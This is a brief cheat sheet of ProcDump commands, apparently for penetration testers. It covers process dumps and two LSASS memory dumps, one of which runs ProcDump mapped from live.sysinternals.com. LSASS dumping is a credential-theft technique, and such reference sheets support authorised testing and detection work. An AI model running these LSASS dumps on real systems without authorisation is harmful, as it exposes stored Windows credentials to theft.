# ProcDump

## lsass

### Dump process by PID

Create a full dump for a process ID.

```cmd title:"ProcDump Dump process by PID"
procdump.exe -accepteula -ma "$pid" "$dump_file"
```
<!-- cheat
var pid
var dump_file
-->

### Dump process by name

Create a full dump for a named process.

```cmd title:"ProcDump Dump process by name"
procdump.exe -accepteula -ma "$process_name" "$dump_file"
```
<!-- cheat
var process_name
var dump_file
-->

### Local LSASS dump

Dump LSASS with a local ProcDump binary.

```cmd title:"Dump LSASS with local ProcDump"
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->

### Live Sysinternals LSASS dump

Map live.sysinternals.com and dump LSASS with ProcDump.

```cmd title:"Dump LSASS with ProcDump from live.sysinternals.com"
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->
